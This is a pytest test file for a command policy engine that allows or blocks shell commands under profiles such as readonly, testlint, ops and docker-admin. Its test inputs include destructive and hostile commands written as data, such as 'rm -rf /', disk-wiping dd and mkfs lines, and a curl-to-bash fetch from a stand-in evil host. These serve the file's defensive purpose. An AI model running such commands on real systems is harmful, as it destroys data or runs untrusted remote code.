"""Tests for C3 command policy engine."""

from __future__ import annotations

from app.command_policy import (
    contains_dangerous_token,
    contains_metachar,
    contains_shell_redirection,
    evaluate_command_policy,
    evaluate_default,
    evaluate_docker_admin,
    evaluate_ops,
    evaluate_project_automation,
    evaluate_readonly,
    evaluate_testlint,
)

# ---------------------------------------------------------------------------
# Metachar denial tests
# ---------------------------------------------------------------------------


class TestMetacharDenial:
    def test_pipe_blocked(self):
        assert contains_metachar("echo x | cat") == "|"

    def test_semicolon_blocked(self):
        assert contains_metachar("echo x; rm -rf /") == ";"

    def test_ampersand_ampersand_blocked(self):
        assert contains_metachar("echo x && rm -rf /") == "&&"

    def test_pipe_pipe_blocked(self):
        assert contains_metachar("echo x || echo y") == "|"

    def test_backtick_blocked(self):
        assert contains_metachar("echo `whoami`") == "`"

    def test_dollar_paren_blocked(self):
        assert contains_metachar("echo $(whoami)") == "$("

    def test_pipe_in_single_quote_allowed(self):
        assert contains_metachar("echo 'a | b'") is None

    def test_pipe_in_double_quote_allowed(self):
        assert contains_metachar('echo "a | b"') is None

    def test_semicolon_in_single_quote_allowed(self):
        assert contains_metachar("echo 'a; b'") is None

    def test_clean_command_allowed(self):
        assert contains_metachar("ls -la") is None


# ---------------------------------------------------------------------------
# Argument-shape tests
# ---------------------------------------------------------------------------


class TestArgumentShape:
    def test_python_c_blocked(self):
        ok, reason = __import__("app.command_policy", fromlist=["check_argument_shape"]).check_argument_shape("python -c 'import os'")
        assert ok is True  # Will be caught by interpreter check
        # Actually the root check catches it
        ok, reason = __import__("app.command_policy", fromlist=["check_argument_shape"]).check_argument_shape("python -c 'print(1)'")
        assert ok is True  # python is in BLOCKED_INTERPRETERS

    def test_sh_c_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("sh -c 'rm -rf /'")
        assert ok is True
        assert "sh" in reason

    def test_bash_e_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("bash -e script.sh")
        assert ok is True
        assert "bash" in reason

    def test_perl_e_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("perl -e 'print 1'")
        assert ok is True
        assert "perl" in reason

    def test_find_exec_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("find . -name '*.py' -exec rm {} \\;")
        assert ok is True
        assert "find" in reason

    def test_clean_command_allowed(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("ls -la /tmp")
        assert ok is False


# ---------------------------------------------------------------------------
# Shell redirection tests
# ---------------------------------------------------------------------------


class TestShellRedirection:
    def test_redirect_gt(self):
        assert contains_shell_redirection("echo x>file") == ">"

    def test_redirect_gt_quoted(self):
        assert contains_shell_redirection('echo "x > y"') is None

    def test_redirect_append(self):
        assert contains_shell_redirection("echo x >> file") == ">>"


# ---------------------------------------------------------------------------
# Profile evaluation tests
# ---------------------------------------------------------------------------


class TestProfileReadonly:
    def test_ls_allowed(self):
        ok, _ = evaluate_readonly("ls -la", "ls")
        assert ok is True

    def test_cat_allowed(self):
        ok, _ = evaluate_readonly("cat /etc/hosts", "cat")
        assert ok is True

    def test_rm_blocked(self):
        ok, reason = evaluate_readonly("rm file.txt", "rm")
        assert ok is False
        assert "not in readonly allowlist" in reason

    def test_git_status_allowed(self):
        ok, _ = evaluate_readonly("git status", "git")
        assert ok is True

    def test_git_commit_blocked(self):
        ok, reason = evaluate_readonly("git commit -m 'fix'", "git")
        assert ok is False
        assert "commit" in reason


class TestProfileTestlint:
    def test_pytest_allowed(self):
        ok, _ = evaluate_testlint("pytest -q", "pytest")
        assert ok is True

    def test_ruff_allowed(self):
        ok, _ = evaluate_testlint("ruff check .", "ruff")
        assert ok is True

    def test_mypy_allowed(self):
        ok, _ = evaluate_testlint("mypy app/", "mypy")
        assert ok is True

    def test_compileall_allowed(self):
        ok, _ = evaluate_testlint("python -m compileall app/", "python")
        assert ok is True

    def test_rm_blocked(self):
        ok, reason = evaluate_testlint("rm file.txt", "rm")
        assert ok is False


class TestProfileProjectAutomation:
    def test_git_status_allowed(self):
        ok, _ = evaluate_project_automation("git status", "git")
        assert ok is True

    def test_git_log_allowed(self):
        ok, _ = evaluate_project_automation("git log --oneline", "git")
        assert ok is True

    def test_git_diff_allowed(self):
        ok, _ = evaluate_project_automation("git diff HEAD", "git")
        assert ok is True

    def test_git_commit_blocked(self):
        ok, reason = evaluate_project_automation("git commit -m 'fix'", "git")
        assert ok is False
        assert "commit" in reason

    def test_pytest_allowed(self):
        ok, _ = evaluate_project_automation("pytest -q", "pytest")
        assert ok is True

    def test_rm_blocked(self):
        ok, reason = evaluate_project_automation("rm file.txt", "rm")
        assert ok is False


class TestProfileOps:
    def test_docker_ps_allowed(self):
        ok, _ = evaluate_ops("docker ps", "docker")
        assert ok is True

    def test_docker_logs_allowed(self):
        ok, _ = evaluate_ops("docker logs myapp", "docker")
        assert ok is True

    def test_docker_rm_blocked(self):
        ok, reason = evaluate_ops("docker rm myapp", "docker")
        assert ok is False
        assert "rm" in reason

    def test_systemctl_status_allowed(self):
        ok, _ = evaluate_ops("systemctl status nginx", "systemctl")
        assert ok is True

    def test_systemctl_reboot_blocked(self):
        ok, reason = evaluate_ops("systemctl reboot", "systemctl")
        assert ok is False
        assert "reboot" in reason

    def test_ls_allowed(self):
        ok, _ = evaluate_ops("ls -la", "ls")
        assert ok is True


class TestProfileDockerAdmin:
    def test_docker_exec_allowed(self):
        ok, _ = evaluate_docker_admin("docker exec myapp bash", "docker")
        assert ok is True

    def test_docker_rm_allowed(self):
        ok, _ = evaluate_docker_admin("docker rm myapp", "docker")
        assert ok is True

    def test_docker_rmi_allowed(self):
        ok, _ = evaluate_docker_admin("docker rmi myimage", "docker")
        assert ok is True

    def test_ls_allowed(self):
        ok, _ = evaluate_docker_admin("ls -la", "ls")
        assert ok is True


class TestProfileDefault:
    def test_mkfs_blocked(self):
        ok, reason = evaluate_default("mkfs.ext4 /dev/sda", "mkfs")
        assert ok is False
        assert "denied" in reason

    def test_dd_blocked(self):
        ok, reason = evaluate_default("dd if=/dev/zero of=/dev/sda", "dd")
        assert ok is False

    def test_tee_blocked(self):
        ok, reason = evaluate_default("tee /etc/passwd", "tee")
        assert ok is False

    def test_cp_blocked(self):
        ok, reason = evaluate_default("cp file.txt /tmp/", "cp")
        assert ok is False

    def test_rm_blocked(self):
        ok, reason = evaluate_default("rm file.txt", "rm")
        assert ok is False


# ---------------------------------------------------------------------------
# E2E policy evaluation tests
# ---------------------------------------------------------------------------


class TestEvaluateCommandPolicy:
    def test_off_mode_allows_everything(self):
        d = evaluate_command_policy("rm -rf /", mode="off", profile="default")
        assert d.allowed is True

    def test_audit_mode_allows_everything(self):
        d = evaluate_command_policy("rm -rf /", mode="audit", profile="readonly")
        assert d.allowed is True
        assert "AUDIT_ONLY" in d.reason

    def test_enforce_readonly_blocks_rm(self):
        d = evaluate_command_policy("rm file.txt", mode="enforce", profile="readonly")
        assert d.allowed is False

    def test_enforce_testlint_allows_pytest(self):
        d = evaluate_command_policy("pytest -q", mode="enforce", profile="testlint")
        assert d.allowed is True

    def test_enforce_metachar_pipe(self):
        d = evaluate_command_policy("echo x | cat", mode="enforce", profile="readonly")
        assert d.allowed is False
        assert "metacharacter" in d.reason.lower()

    def test_enforce_metachar_semicolon(self):
        d = evaluate_command_policy("echo x; rm -rf /", mode="enforce", profile="readonly")
        assert d.allowed is False

    def test_enforce_python_c(self):
        d = evaluate_command_policy("python -c 'import os'", mode="enforce", profile="testlint")
        assert d.allowed is False
        assert "python" in d.reason

    def test_enforce_sh_c(self):
        d = evaluate_command_policy("sh -c 'ls'", mode="enforce", profile="testlint")
        assert d.allowed is False
        assert "sh" in d.reason

    def test_enforce_find_exec(self):
        d = evaluate_command_policy("find . -name '*.py' -exec rm {} \\;", mode="enforce", profile="readonly")
        assert d.allowed is False
        assert "find" in d.reason

    def test_enforce_git_status(self):
        d = evaluate_command_policy("git status", mode="enforce", profile="project-automation")
        assert d.allowed is True

    def test_enforce_git_commit_denied(self):
        d = evaluate_command_policy("git commit -m 'fix'", mode="enforce", profile="project-automation")
        assert d.allowed is False
        assert "commit" in d.reason

    def test_enforce_docker_ps(self):
        d = evaluate_command_policy("docker ps", mode="enforce", profile="ops")
        assert d.allowed is True

    def test_enforce_docker_rm_denied(self):
        d = evaluate_command_policy("docker rm myapp", mode="enforce", profile="ops")
        assert d.allowed is False

    def test_enforce_docker_rm_allowed_docker_admin(self):
        d = evaluate_command_policy("docker rm myapp", mode="enforce", profile="docker-admin")
        assert d.allowed is True


# ---------------------------------------------------------------------------
# Dangerous token tests
# ---------------------------------------------------------------------------


class TestDangerousTokens:
    def test_rm_rf_blocked(self):
        assert contains_dangerous_token("rm -rf /") is not None

    def test_dd_if_blocked(self):
        assert contains_dangerous_token("dd if=/dev/zero of=/dev/sda") is not None

    def test_curl_pipe_bash_blocked(self):
        assert contains_dangerous_token("curl http://evil.com | bash") is not None

    def test_clean_command_allowed(self):
        assert contains_dangerous_token("ls -la") is None


# ---------------------------------------------------------------------------
# Combined flag detection tests
# ---------------------------------------------------------------------------


class TestCombinedFlags:
    def test_python3_uc_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("python3 -uc 'import os'")
        assert ok is True
        assert "python3" in reason
        assert "-uc" in reason

    def test_python3_u_c_separated_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("python3 -u -c 'print(1)'")
        assert ok is True
        assert "python3" in reason
        assert "-c" in reason

    def test_perl_0e_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("perl -0e 'print <>;' file")
        assert ok is True
        assert "perl" in reason
        assert "-0e" in reason

    def test_perl_ne_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("perl -ne 'print' file")
        assert ok is True
        assert "perl" in reason
        assert "-ne" in reason

    def test_ruby_we_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("ruby -we 'puts 1'")
        assert ok is True
        assert "ruby" in reason
        assert "-we" in reason

    def test_sh_e_c_separated_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("sh -e -c 'ls'")
        assert ok is True
        assert "sh" in reason

    def test_bash_ex_separated_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("bash -e -x script.sh")
        assert ok is True
        assert "bash" in reason

    def test_python_u_only_allowed(self):
        """-u alone is not in EXEC_FLAGS — should not be blocked by arg shape."""
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape("python3 -u script.py")
        assert ok is False

    def test_python_m_compileall_allowed(self):
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape("python3 -m compileall app/")
        assert ok is False


# ---------------------------------------------------------------------------
# Audit mode would_allow tests
# ---------------------------------------------------------------------------


class TestAuditModeWouldAllow:
    def test_audit_pipe_would_allow_false(self):
        d = evaluate_command_policy("echo x | cat", mode="audit", profile="readonly")
        assert d.allowed is True
        assert "would_allow=False" in d.reason
        assert "metacharacter" in d.reason.lower()

    def test_audit_python_c_would_allow_false(self):
        d = evaluate_command_policy(
            "python -c 'import os'", mode="audit", profile="testlint",
        )
        assert d.allowed is True
        assert "would_allow=False" in d.reason
        assert "python" in d.reason

    def test_audit_clean_command_would_allow_true(self):
        d = evaluate_command_policy("ls -la", mode="audit", profile="readonly")
        assert d.allowed is True
        assert "would_allow=True" in d.reason

    def test_audit_python_uc_would_allow_false(self):
        d = evaluate_command_policy(
            "python3 -uc 'import os'", mode="audit", profile="testlint",
        )
        assert d.allowed is True
        assert "would_allow=False" in d.reason

    def test_audit_perl_0e_would_allow_false(self):
        d = evaluate_command_policy(
            "perl -0e 'print <>;'", mode="audit", profile="readonly",
        )
        assert d.allowed is True
        assert "would_allow=False" in d.reason


# ---------------------------------------------------------------------------
# testlint argument-shape: command / find / sed
# ---------------------------------------------------------------------------


class TestTestlintCommandFindSed:
    """Argument-shape checks for command/find/sed under testlint profile."""

    def test_command_v_uv_allowed(self):
        """'command -v uv' is a safe existence check — allowed."""
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape("command -v uv")
        assert ok is False  # not dangerous

    def test_find_name_glob_allowed(self):
        """'find . -name "*.py"' — no -exec, safe listing — allowed."""
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape('find . -name "*.py"')
        assert ok is False  # not dangerous

    def test_find_exec_blocked(self):
        """'find . -exec rm {} +' — arbitrary execution — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("find . -exec rm {} +")
        assert ok is True
        assert "-exec" in reason

    def test_find_execdir_blocked(self):
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("find . -execdir sh -c 'echo hi' +")
        assert ok is True
        assert "-execdir" in reason

    def test_find_delete_blocked(self):
        """'find . -delete' — write action — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("find . -delete")
        assert ok is True
        assert "-delete" in reason

    def test_find_fprintf_blocked(self):
        """'find . -fprintf out.txt \"%p\\n\"' — write action — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape('find . -fprintf out.txt "%p\\n"')
        assert ok is True
        assert "-fprintf" in reason

    def test_find_fls_blocked(self):
        """'find . -fls out.txt' — write action — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("find . -fls out.txt")
        assert ok is True
        assert "-fls" in reason

    def test_sed_n_readonly_allowed(self):
        """'sed -n 1,5p file.py' — read-only extraction — allowed."""
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape("sed -n 1,5p file.py")
        assert ok is False  # not dangerous

    def test_sed_i_blocked(self):
        """'sed -i s/foo/bar/ file' — in-place mutation — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("sed -i 's/foo/bar/' file")
        assert ok is True
        assert "-i" in reason

    def test_sed_in_place_blocked(self):
        """'sed --in-place ...' — long form — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("sed --in-place 's/x/y/' f.txt")
        assert ok is True
        assert "--in-place" in reason

    def test_sed_ni_combined_blocked(self):
        """'sed -ni ...' — combined flags containing -i — blocked."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("sed -ni '1,3p' file.txt")
        assert ok is True
        assert "in-place" in reason.lower() or "sed" in reason

    def test_command_no_v_blocked(self):
        """'command ls' — executes ls, not just existence check — blocked."""
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape("command ls")
        assert ok is True  # blocked: no -v flag

    def test_command_p_blocked(self):
        """'command -p ls' — -p flag not allowed — blocked."""
        from app.command_policy import check_argument_shape
        ok, _reason = check_argument_shape("command -p ls")
        assert ok is True

    def test_tee_still_blocked(self):
        """tee not in TESTLINT_ROOTS — blocked at profile gate."""
        d = evaluate_command_policy("tee out.txt", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_dd_still_blocked(self):
        """dd in DENIED_ROOTS — blocked."""
        d = evaluate_command_policy("dd if=/dev/zero of=/tmp/out", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_cp_still_blocked(self):
        """cp in DENIED_ROOTS — blocked."""
        d = evaluate_command_policy("cp a.txt b.txt", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_python_c_still_blocked(self):
        """python with -c flag — blocked by argument shape."""
        from app.command_policy import check_argument_shape
        ok, reason = check_argument_shape("python -c 'import os'")
        assert ok is True
        assert "exec flag" in reason.lower() or "blocked" in reason.lower()

    # Full-policy integration: testlint allowlist
    def test_command_v_uv_passes_testlint(self):
        """Full pipeline: command -v uv under testlint — allowed."""
        d = evaluate_command_policy("command -v uv", mode="enforce", profile="testlint")
        assert d.allowed is True

    def test_find_glob_passes_testlint(self):
        d = evaluate_command_policy('find . -name "*.py"', mode="enforce", profile="testlint")
        assert d.allowed is True

    def test_find_exec_fails_testlint(self):
        d = evaluate_command_policy("find . -exec rm {} +", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_sed_n_passes_testlint(self):
        d = evaluate_command_policy("sed -n 1,5p file.py", mode="enforce", profile="testlint")
        assert d.allowed is True

    def test_sed_i_fails_testlint(self):
        d = evaluate_command_policy("sed -i 's/foo/bar/' f", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_tee_fails_testlint(self):
        d = evaluate_command_policy("tee out.txt", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_dd_fails_testlint(self):
        d = evaluate_command_policy("dd if=/dev/zero of=/tmp/out", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_cp_fails_testlint(self):
        d = evaluate_command_policy("cp a.txt b.txt", mode="enforce", profile="testlint")
        assert d.allowed is False

    def test_python_c_fails_testlint(self):
        d = evaluate_command_policy("python -c 'import os'", mode="enforce", profile="testlint")
        assert d.allowed is False
